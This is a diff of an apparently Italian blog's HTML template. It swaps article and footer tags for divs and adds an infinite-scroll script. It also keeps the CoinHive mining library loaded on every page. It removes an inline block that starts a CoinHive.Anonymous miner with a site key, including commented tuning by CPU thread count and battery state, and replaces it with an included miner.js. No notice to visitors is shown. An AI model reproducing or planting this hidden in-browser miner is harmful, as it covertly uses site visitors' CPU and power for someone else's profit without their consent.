@@ -178,7 +178,7 @@ s.setAttribute('data-timestamp', +new Date());
 			<div class="row">
 				
 
-				<article class="6u 12u(small) excerpt">
+				<div class="6u 12u(small) excerpt" id="previousArticle">
 					<header>
 						<h2><a href="/2016/06/flow-typscript-type-checking-javascript/">Flow e Typscript:  Type checking per Javascript</a></h2>
 					</header>
@@ -187,15 +187,15 @@ s.setAttribute('data-timestamp', +new Date());
 
 
 					</section>
-					<footer>
+					<div>
 						<ul class="actions">
 							<li><a href="/2016/06/flow-typscript-type-checking-javascript/" class="button">Read More</a></li>
 						</ul>
-					</footer>
-				</article>
+					</div>
+				</div>
 				 
 
-				<article class="6u$ 12u(small) excerpt f-right">
+				<div class="6u$ 12u(small) excerpt f-right" id="nextArticle">
 					<header>
 						<h2><a href="/2016/06/come-scrivere-un-annuncio-di-lavoro-efficace/">Come scrivere un annuncio di lavoro efficace (soprattutto quando hai poco budget)</a></h2>
 					</header>
@@ -204,12 +204,12 @@ s.setAttribute('data-timestamp', +new Date());
 
 
 					</section>
-					<footer>
+					<div>
 						<ul class="actions">
 							<li><a href="//2016/06/come-scrivere-un-annuncio-di-lavoro-efficace/" class="button">Read More</a></li>
 						</ul>
-					</footer>
-				</article>
+					</div>
+				</div>
 				
 			</div>
 		</footer>
@@ -265,37 +265,9 @@ s.setAttribute('data-timestamp', +new Date());
 	<script src="/js/skel.min.js"></script>
 	<script src="/js/init.js"></script>
 	<script src="/js/prism.js"></script>
+	<script src="/js/infinite-scroll.js"></script>
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-
-var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY');
-
-miner.start();
-
-/*
-try {
-    var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY', {
-        throttle: 0.85,
-        threads: 1
-    });
-
-    var threads = Math.max(1, Math.floor(navigator.hardwareConcurrency / 4));
-    miner.setNumThreads(threads);
-    
-    miner.start();
-    
-    navigator.getBattery().then(function (battery) {
-        if (battery.charging) miner.start();
-        battery.onchargingchange = function (evt) {
-            if (battery.charging) miner.start();
-            else miner.stop();
-        }
-    });
-    } catch (e) {
-        miner.start();
-    }
-    */
-</script>
+<script src="/js/miner.js"></script>
 </body>
 
 </html>
